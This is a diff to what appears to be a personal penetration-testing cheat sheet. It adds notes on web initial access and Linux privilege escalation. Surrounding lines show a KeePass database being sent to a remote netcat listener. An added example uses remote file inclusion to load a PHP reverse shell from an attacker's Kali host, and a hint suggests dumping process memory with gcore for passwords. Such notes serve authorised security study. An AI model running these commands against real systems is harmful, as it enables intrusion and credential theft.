@@ -126,6 +126,33 @@ Get-Content "Database.kdbx" | .\nc.exe 192.168.45.239 5555
 nc -lnvp 5555 > Database.kdbx
 ```
 
+# 🔹Initial Access
+```
+Point of entry: web
+
+What kind of web technology is being ran? PHP? JAVA? etc
+Knowing this = we know what kind of payload to run
+On the Point of entry: can it be LFI // RFI?
+
+RFI: http://url.com/image.php?imd=http://KALI/PHP-reverse-shell.php
+
+
+```
+Public exploits-> Sometimes, you need to change the payload
+![image](https://github.com/user-attachments/assets/11a91186-4558-42e7-b5c4-e3c2a0410752)
+
+
+```
+
+# 🔹Linux Privilege Escalation
+```
+Sudo -l -> gcore -> check running processes for any Password dumping related processes
+```
+
+```
+Is any of the local binary vulnerable? Sudo vulnerable?
+```
+
 keepassxc 
 ```
 
